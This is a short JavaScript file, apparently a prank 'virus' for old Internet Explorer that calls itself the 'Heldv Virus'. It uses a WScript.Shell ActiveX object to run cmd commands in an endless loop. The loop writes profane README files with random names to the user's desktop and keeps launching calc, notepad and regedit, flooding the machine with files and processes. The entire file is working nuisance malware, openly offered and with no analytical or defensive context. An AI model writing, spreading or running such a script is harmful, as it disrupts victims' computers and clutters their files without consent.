//if(typeof(window.ActiveXObject)=="undefined"){
 //   alert("Sorry We Deleted This Virus");
//}else {
    alert("Are You Sure About This If You Not Sure About This Close This Page!");
    alert("Ok Heldv Virus Starting!")
    function runCmd(command, option)
{
    var char34 = String.fromCharCode(34);
    var wsh = new ActiveXObject('WScript.Shell');
    if (wsh)
    {
        command = 'cmd /k ' + char34 + wsh.ExpandEnvironmentStrings(command) + ' ';
        command = command + char34 + wsh.ExpandEnvironmentStrings(option) + char34  + char34;
        if (confirm(command))
        {
            wsh.Run(command);
        }
    }
}

while(true){
    runCmd("echo.exe","FUCKED BY HELDV VIRUS!!! > C:\\Users\\%username%\\Desktop\\README%random%.TXT")
    runCmd("echo.exe","Do You Need Some Mommy ;(")
    runCmd("calc.exe","31")
    runCmd("notepad.exe","FUCKED")
    runCmd("regedit.exe","yemm")
}

//}


